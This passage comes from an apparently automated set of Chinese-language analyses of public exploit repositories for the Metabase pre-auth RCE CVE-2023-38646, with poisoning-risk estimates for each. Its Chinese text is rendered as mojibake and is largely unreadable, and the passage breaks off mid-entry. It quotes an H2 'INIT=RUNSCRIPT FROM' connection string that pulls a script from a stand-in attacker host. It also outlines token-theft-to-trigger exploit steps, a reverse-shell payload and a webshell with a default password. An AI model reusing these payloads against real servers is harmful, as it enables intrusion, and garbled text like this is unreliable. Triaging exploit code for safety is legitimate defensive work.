æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

